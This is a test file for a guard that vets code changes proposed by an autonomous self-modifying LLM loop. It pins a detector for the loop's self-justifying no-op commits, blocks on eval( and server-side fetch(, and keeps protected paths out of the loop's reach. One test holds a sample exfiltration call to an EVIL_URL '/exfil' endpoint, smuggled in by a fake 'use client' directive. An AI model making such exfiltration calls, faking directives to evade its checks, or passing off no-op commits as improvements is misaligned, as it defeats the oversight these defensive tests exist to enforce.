import { describe, test, expect } from "bun:test";
import {
  detectConvergentMove,
  finalAuthority,
  gateMutation,
  triageProposal,
} from "./mutation-guard";

/**
 * Characterization tests for the convergent-move detector.
 *
 * The detector identifies the loop's most common self-justifying no-op:
 * a small, predominantly-additive diff, dominated by defensive-guard
 * lexicon, with no behavioral signal. Each test below pins one branch
 * of the four-condition heuristic + a regression suite of REAL diffs
 * sampled from the loop's own commit history (the exact patterns the
 * guard was written to catch).
 *
 * This file lives in src/lib/pipeline/core/ — a PROTECTED_PREFIX — so the
 * loop can never weaken its own characterization tests. The TEST-ATTACKER
 * will run against this file; any mutation of the guard that would let a
 * convergent move through should break at least one test below.
 */
describe("detectConvergentMove", () => {
  // ── Condition 0: no diff ──────────────────────────────────────────

  test("returns not-convergent when there is no diff", () => {
    const code = "function f(x: number) { return x + 1; }";
    const r = detectConvergentMove(code, code);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/no diff/);
  });

  // ── Condition 1: diff size cap ────────────────────────────────────

  test("returns not-convergent when total churn exceeds 30 lines", () => {
    // 35 added guard lines — exceeds the cap.
    const original = "function f() { return 1; }\n";
    const lines: string[] = ["function f() { return 1; }"];
    for (let i = 0; i < 35; i++) {
      lines.push(`if (x${i} === null) return;`);
    }
    const evolved = lines.join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/diff too large/);
  });

  // ── Condition 2: predominantly additive ──────────────────────────

  test("returns not-convergent when net guard increase < 2 (single guard is a judgment call, not a pattern)", () => {
    const original = "function f() { return 1; }";
    const evolved = "function f() { return 1; }\nif (!x) return;";
    // 1 added guard line. Net guard increase = 1 < 2 → not convergent.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/net guard-lexicon increase 1 < 2/);
  });

  test("returns not-convergent when removed lines contain behavioral signal (real refactor, not convergent)", () => {
    const original = [
      "function f() { return 1; }",
      "function g() { return 2; }",
      "function h() { return 3; }",
      "function i() { return 4; }",
    ].join("\n");
    const evolved = [
      "function f() { return 1; }",
      "if (!x) return;",
      "if (!y) return;",
      "if (!z) return;",
    ].join("\n");
    // 3 added guards, 3 removed functions. Net guard increase = 3 >= 2,
    // BUT the removed lines contain `function` (behavioral signal) →
    // real refactor, not convergent. (The redesign's (3b) check.)
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/removes behavioral signal/);
  });

  // ── Condition 2: net guard-lexicon increase ────────────────────────

  test("returns not-convergent when additions are not guard-dominated (net increase < 2)", () => {
    // 3 added lines of real logic, 1 guard → net guard increase = 1 < 2.
    const original = "function f() { return 1; }";
    const evolved = [
      "function f() { return 1; }",
      "const result = computeThing();",
      "const cached = cache.get(key);",
      "const transformed = transform(result, cached);",
      "if (!x) return;", // 1 guard line
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/net guard-lexicon increase 1 < 2/);
  });
  // ── Condition 4: behavioral signal escape hatch ──────────────────

  test("returns not-convergent when additions include a new export", () => {
    const original = "function f() { return 1; }";
    const evolved = [
      "function f() { return 1; }",
      "export function g() { return 2; }",
      "if (!x) return;",
      "if (!y) return;",
      "if (!z) return;",
    ].join("\n");
    // 4 added lines: 1 export (behavioral signal) + 3 guards.
    // Even though guard density is 75%, the export breaks condition 4.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/behavioral signal/);
  });

  test("returns not-convergent when additions include a new function", () => {
    const original = "function f() { return 1; }";
    const evolved = [
      "function f() { return 1; }",
      "function g() { return 2; }",
      "if (!x) return;",
      "if (!y) return;",
      "if (!z) return;",
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/behavioral signal/);
  });

  test("returns not-convergent when additions include a new class", () => {
    const original = "function f() { return 1; }";
    const evolved = [
      "function f() { return 1; }",
      "class Widget { constructor() {} }",
      "if (!x) return;",
      "if (!y) return;",
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/behavioral signal/);
  });

  test("returns not-convergent when additions include a constructed throw", () => {
    const original = "function f() { return 1; }";
    const evolved = [
      "function f() { return 1; }",
      "throw new Error('bad input');",
      "if (!x) return;",
      "if (!y) return;",
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
    expect(r.reason).toMatch(/behavioral signal/);
  });

  // ── Positive cases: real convergent moves from the loop's history ─

  test("flags the loop's `let parsed;` → `let parsed: any;` pattern (commit 0f3a034 class)", () => {
    // The actual loop commit changed ONE line: `let parsed;` to
    // `let parsed: any;` but claimed 4 improvements in the message.
    // The guard must catch this kind of convergent type-annotation move
    // when the LLM bundles multiple guard additions together.
    const original = [
      "function f() {",
      "  let parsed;",
      "  try { parsed = JSON.parse(raw); } catch { return null; }",
      "  return parsed;",
      "}",
    ].join("\n");
    const evolved = [
      "function f() {",
      "  let parsed: any;",
      "  try { parsed = JSON.parse(raw); } catch { return null; }",
      "  if (parsed === null) return null;",
      "  if (parsed === undefined) return null;",
      "  return parsed;",
      "}",
    ].join("\n");
    // Added: `let parsed: any;` (matches `: any` lexicon), 2 null checks.
    // Removed: `let parsed;`. 3 added, 1 removed → predominantly additive.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(true);
  });

  test("flags the loop's `{entry.trust}` → `{entry.trust ?? \"unknown\"}` pattern (commit f0ec6f5 class)", () => {
    const original = [
      "function Render({ entry }) {",
      "  return <Badge>{entry.trust}</Badge>;",
      "}",
    ].join("\n");
    const evolved = [
      "function Render({ entry }) {",
      "  if (entry.trust === null) return <Badge>{'unknown'}</Badge>;",
      "  if (entry.trust === undefined) return <Badge>{'unknown'}</Badge>;",
      "  return <Badge>{entry.trust ?? 'unknown'}</Badge>;",
      "}",
    ].join("\n");
    // 3 added guard lines, 1 removed (the original return).
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(true);
  });

  test("flags a bundle of typeof + Array.isArray + instanceof Error guards (the canonical convergent shape)", () => {
    const original = [
      "function process(input) {",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const evolved = [
      "function process(input) {",
      "  if (typeof input !== 'object') return [];",
      "  if (!Array.isArray(input)) return [];",
      "  if (input === null) return [];",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    // 4 added guards, 0 removed. All 4 match the lexicon.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(true);
  });

  test("flags a try-catch wrap around existing code (the 'improved error handling' pattern)", () => {
    const original = [
      "function readThing() {",
      "  return JSON.parse(readFileSync(path, 'utf8'));",
      "}",
    ].join("\n");
    const evolved = [
      "function readThing() {",
      "  try {",
      "    return JSON.parse(readFileSync(path, 'utf8'));",
      "  } catch (err) {",
      "    if (err instanceof Error) console.error(err.message);",
      "    return null;",
      "  }",
      "}",
    ].join("\n");
    // Added: try {, instanceof Error, return null; (2 lines). Removed: nothing.
    // The `try {` and `instanceof Error` match the lexicon.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(true);
  });

  // ── finalAuthority integration ───────────────────────────────────

  test("finalAuthority rejects a convergent move on a non-test file", () => {
    const original = [
      "function process(input) {",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const evolved = [
      "function process(input) {",
      "  if (typeof input !== 'object') return [];",
      "  if (!Array.isArray(input)) return [];",
      "  if (input === null) return [];",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const r = finalAuthority({
      filePath: "src/components/widget.tsx",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.allowed).toBe(false);
    expect(r.reasons.some((x) => x.includes("convergent-move"))).toBe(true);
  });

  test("finalAuthority EXEMPTS test files — tests legitimately add defensive guards as pins", () => {
    // Same convergent-looking diff, but on a .test.ts file in a NON-
    // protected path → must pass. (A .test.ts file under core/ would
    // still be rejected by the protected-path check, which runs first.)
    const original = [
      "function process(input) {",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const evolved = [
      "function process(input) {",
      "  if (typeof input !== 'object') return [];",
      "  if (!Array.isArray(input)) return [];",
      "  if (input === null) return [];",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const r = finalAuthority({
      filePath: "src/lib/pipeline/autonomous/widget.test.ts",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.allowed).toBe(true);
    expect(r.reasons).toEqual([]);
  });

  test("finalAuthority allows a real refactor that happens to add a guard (behavioral signal present)", () => {
    const original = [
      "function process(input) {",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const evolved = [
      "function process(input) {",
      "  if (!Array.isArray(input)) return [];",
      "  return input.map((x) => x.value);",
      "}",
      "export function safeProcess(input) {",
      "  return process(input ?? []);",
      "}",
    ].join("\n");
    // Adds a guard BUT also adds a new export → behavioral signal → allowed.
    const r = finalAuthority({
      filePath: "src/lib/pipeline/autonomous/widget.ts",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.allowed).toBe(true);
  });

  // ── gateMutation integration ─────────────────────────────────────

  test("gateMutation reports rejectedBy='finalAuthority' for a convergent move", () => {
    const original = [
      "function process(input) {",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const evolved = [
      "function process(input) {",
      "  if (typeof input !== 'object') return [];",
      "  if (!Array.isArray(input)) return [];",
      "  if (input === null) return [];",
      "  return input.map((x) => x.value);",
      "}",
    ].join("\n");
    const r = gateMutation({
      filePath: "src/components/widget.tsx",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.allowed).toBe(false);
    expect(r.rejectedBy).toBe("finalAuthority");
    expect(r.reasons.some((x) => x.includes("convergent-move"))).toBe(true);
  });

  // ── CLIENT-COMPONENT FETCH EXEMPTION (audit 8) ────────────────────

  test("triage EXEMPTS fetch( for client components (original also had use client)", () => {
    // A new client panel that calls fetch("/api/...") — the standard
    // React pattern for calling app routes. The guard must NOT flag
    // the new fetch( as a dangerous token when "use client" is present.
    const original = `"use client";\nimport { useState } from "react";\nexport function Panel() { return <div>empty</div>; }\n`;
    const evolved = `"use client";\nimport { useState, useEffect } from "react";\nexport function Panel() {\n  const [data, setData] = useState(null);\n  useEffect(() => {\n    fetch("/api/self-enhance/tasks").then(r => r.json()).then(setData);\n  }, []);\n  return <div>{JSON.stringify(data)}</div>;\n}\n`;
    const r = triageProposal({
      filePath: "src/components/pipeline/oracle-task-feed-panel.tsx",
      originalCode: original,
      evolvedCode: evolved,
    });
    // fetch is exempted for client components — the verdict must not
    // be "evil" on the fetch token. (It may be "good" or "unsure" on
    // other grounds, but NOT evil-with-fetch-reason.)
    expect(r.verdict).not.toBe("evil");
    expect(r.reasons.some((x) => x.includes("fetch("))).toBe(false);
  });

  test("triage STILL BLOCKS fetch( for server modules (no use client directive)", () => {
    // Same fetch addition, but no "use client" — this is a server
    // module acquiring a new fetch(, which is the escape pattern the
    // guard was written to catch. Must still be flagged evil.
    const original = `import { db } from "@/lib/db";\nexport function getStatus() { return { ok: true }; }\n`;
    const evolved = `import { db } from "@/lib/db";\nexport function getStatus() {\n  const r = await fetch(process.env.UPSTREAM_URL + "/health");\n  return r.ok;\n}\n`;
    const r = triageProposal({
      filePath: "src/lib/pipeline/autonomous/widget.ts",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.verdict).toBe("evil");
    expect(r.reasons.some((x) => x.includes("fetch("))).toBe(true);
  });

  test("triage STILL BLOCKS eval( even in client components (exemption is fetch-only)", () => {
    // A client component that adds eval( — the exemption is narrow:
    // only fetch( is exempted for client components. eval, dynamic
    // import, child_process, etc. are still evil in client code.
    const original = `"use client";\nexport function Panel() { return <div />; }\n`;
    const evolved = `"use client";\nexport function Panel({ code }: { code: string }) {\n  return <div>{eval(code)}</div>;\n}\n`;
    const r = triageProposal({
      filePath: "src/components/pipeline/evil-panel.tsx",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.verdict).toBe("evil");
    expect(r.reasons.some((x) => x.includes("eval("))).toBe(true);
  });

  test("gateMutation ALLOWS a new client component that uses fetch( (original empty = new file)", () => {
    // The end-to-end path: a brand-new client panel (created action,
    // original is empty) that uses fetch. gateMutation should allow
    // it through to the debate tribunal / typecheck gate.
    const evolved = `"use client";\nimport { useState, useEffect } from "react";\nimport { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";\n\nexport function OracleTaskFeedPanel() {\n  const [tasks, setTasks] = useState<any[]>([]);\n  useEffect(() => {\n    fetch("/api/self-enhance/tasks?limit=50").then(r => r.json()).then(d => setTasks(d.tasks ?? []));\n  }, []);\n  const failed = tasks.filter((t: any) => t.kind === "oracle-failed-prophecy");\n  return (\n    <Card>\n      <CardHeader><CardTitle>Oracle → Task Feed</CardTitle></CardHeader>\n      <CardContent>{failed.length} failed prophecies feeding tasks</CardContent>\n    </Card>\n  );\n}\n`;
    const r = gateMutation({
      filePath: "src/components/pipeline/oracle-task-feed-panel.tsx",
      originalCode: "",
      evolvedCode: evolved,
    });
    // triage passes (fetch exempted for client component). finalAuthority
    // passes (not a protected path, not empty, NOT a convergent move —
    // the diff adds a new export, which is a behavioral signal).
    expect(r.allowed).toBe(true);
  });

  // ── REGRESSION: defensive modifications to existing lines (audit 8) ──
  // The loop committed convergent no-ops on oracle-task-feed.ts by adding
  // ?. and ?? "N/A" to EXISTING lines (Prisma fields that are guaranteed
  // non-null). The old heuristic's "removed > 2 = real refactor" missed
  // this because each modified line counts as 1 removed + 1 added. The
  // redesign catches it via NET guard-lexicon increase.

  test("flags defensive modifications to existing lines (the oracle-task-feed.ts regression)", () => {
    // Exact pattern from commit 36dce4d on oracle-task-feed.ts: 3 lines
    // modified to add ?? "N/A" to non-null Prisma fields.
    const original = [
      '    `Confidence when made: ${prophecy.confidence.toFixed(2)}. ` +',
      '    `Made at ${prophecy.createdAt.toISOString()}, deadline ${prophecy.evaluateBy.toISOString()}. ` +',
      '    `Criterion: ${prophecy.falsifiabilityCriterion}`',
    ].join("\n");
    const evolved = [
      '    `Confidence when made: ${prophecy.confidence?.toFixed(2) ?? "N/A"}. ` +',
      '    `Made at ${prophecy.createdAt?.toISOString() ?? "N/A"}, deadline ${prophecy.evaluateBy?.toISOString() ?? "N/A"}. ` +',
      '    `Criterion: ${prophecy.falsifiabilityCriterion ?? "N/A"}`',
    ].join("\n");
    // 3 lines modified (3 removed, 3 added). Each added line has `?? "N/A"`
    // matching the nullish-coalescing lexicon. Net guard increase = 3 >= 2.
    // No behavioral signal (no new exports/functions). → convergent.
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(true);
  });

  // ── BYPASS DEFENSE: server module can't fake "use client" (audit 8) ──

  test("triage STILL BLOCKS fetch( when a server module ADDS 'use client' to get the exemption", () => {
    // A server module that adds "use client" at the top + fetch(evilUrl).
    // The exemption requires the ORIGINAL to also have "use client" (or
    // be a new file). A mutation that ADDS "use client" to a server module
    // does NOT get the exemption — the fetch is still flagged.
    const original = 'import { db } from "@/lib/db";\nexport function f() { return db.query(); }\n';
    const evolved = '"use client";\nimport { db } from "@/lib/db";\nexport function f() {\n  return fetch(process.env.EVIL_URL + "/exfil");\n}\n';
    const r = triageProposal({
      filePath: "src/lib/pipeline/autonomous/evil.ts",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(r.verdict).toBe("evil");
    expect(r.reasons.some((x) => x.includes("fetch("))).toBe(true);
  });

  // ── COMMENT FALSE-POSITIVE FIX (audit 8, round 2) ─────────────────

  test("comments containing guard syntax do NOT count as guards", () => {
    // Two comments that DESCRIBE guard behavior — documentation, not
    // code. The old version counted them as guard lines (net +2 →
    // convergent → rejected). With comment-stripping, the guard count
    // sees zero real guards → not convergent.
    const original = "export function f(x: T): R {\n  return transform(x);\n}";
    const evolved = [
      "export function f(x: T): R {",
      "  // typeof x === 'string' fast path handled by transform",
      "  // if (x === null) transform throws — documented upstream contract",
      "  return transform(x);",
      "}",
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    expect(r.convergent).toBe(false);
  });

  test("a comment mentioning 'export function' does NOT trigger the behavioral-signal escape hatch", () => {
    // A convergent move (2 real null guards, no behavioral change) that
    // ALSO adds a comment mentioning "export function". The comment
    // must not rescue the mutation from the convergent rejection.
    const original = [
      "export function process(items: Item[]): number {",
      "  return items.length;",
      "}",
    ].join("\n");
    const evolved = [
      "export function process(items: Item[]): number {",
      "  // export function countItems was merged into process last cycle",
      "  if (items === null) return 0;",        // real guard 1
      "  if (items === undefined) return 0;",   // real guard 2
      "  return items.length;",
      "}",
    ].join("\n");
    const r = detectConvergentMove(original, evolved);
    // The comment is documentation, not surface area — the 2 real guards
    // with no behavioral signal is still convergent.
    expect(r.convergent).toBe(true);
  });

  // ── OPERATOR-APPROVED EXEMPTION (audit 8, round 2) ────────────────

  test("finalAuthority SKIPS the convergent-move check for operator-approved plans", () => {
    // An operator-driven chat-task goal can legitimately be "fix the
    // null handling because the upstream contract changed" — exactly
    // the convergent pattern, but with operator authority behind it.
    // The heuristic is for the AUTONOMOUS loop's convergence tendency,
    // not for operator judgment.
    const original = [
      "export function renderName(user: User): string {",
      "  return `${user.profile.firstName} ${user.profile.lastName}`;",
      "}",
    ].join("\n");
    const evolved = [
      "export function renderName(user: User): string {",
      "  if (user.profile === null) return 'unknown';",
      "  if (user.profile.firstName === undefined) return 'unknown';",
      "  return `${user.profile.firstName} ${user.profile.lastName}`;",
      "}",
    ].join("\n");
    // Without the flag: rejected (convergent).
    const without = finalAuthority({
      filePath: "src/lib/widgets/render.ts",
      originalCode: original,
      evolvedCode: evolved,
    });
    expect(without.allowed).toBe(false);
    expect(without.reasons.some((x) => x.includes("convergent-move"))).toBe(true);
    // With the flag: allowed (operator approved).
    const withFlag = finalAuthority({
      filePath: "src/lib/widgets/render.ts",
      originalCode: original,
      evolvedCode: evolved,
      operatorApproved: true,
    });
    expect(withFlag.allowed).toBe(true);
    expect(withFlag.reasons).toEqual([]);
  });

  test("operatorApproved does NOT bypass protected paths or security checks", () => {
    // The flag skips ONLY the convergent heuristic. A protected path is
    // still rejected, and triage (evil tokens) still runs.
    const original = 'export function f() { return 1; }';
    const evolved = 'export function f() {\n  return eval("1+1");\n}';
    const r = gateMutation({
      filePath: "src/app/page.tsx", // protected path
      originalCode: original,
      evolvedCode: evolved,
      operatorApproved: true,
    });
    expect(r.allowed).toBe(false);
    // triage flags eval( even with the flag:
    expect(r.rejectedBy).toBe("triage");
    expect(r.reasons.some((x) => x.includes("eval("))).toBe(true);
  });
});
